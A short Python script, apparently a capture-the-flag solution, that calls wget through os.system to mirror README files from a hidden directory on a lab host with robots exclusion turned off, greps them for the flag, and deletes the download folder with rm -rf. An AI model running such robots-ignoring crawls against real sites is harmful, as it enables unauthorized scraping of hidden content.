import os

class Scrapping():
    '''
     download all the files to the local system with the web scraper and use find command 
     to search through all thoose files and check if the content of thoose files contains numbers 
     and characters for the flag


        --mirror
        Turn on options suitable for mirroring. This option turns on recursion and time-stamping, sets infinite recursion depth and keeps FTP directory listings.

        -A (Recursive Accept)
        Used to tell the script only to accept Readme for downloading

        -P (Top of the directory)

        -e (execute command, robot=off, this turns off robot exclusion)

        xargs can be thought of as turning its stdin into arguments to the given commands

    '''
    def run_scraping_attack():
        # Creating a directory to store downloaded content
        os.system("mkdir ./info")
        #Script to download files recursively using --mirror. 
        os.system("wget --mirror -A  README -P ./info -e robots=off http://192.168.1.100/.hidden/")
        #read through the downloaded files and search for flag
        os.system("find ./info -name README | xargs grep [0-9] | cut -d : -f2")
        #delete dir after we have processed data and gotten results 
        os.system("rm -rf ./info")

Scrapping.run_scraping_attack()

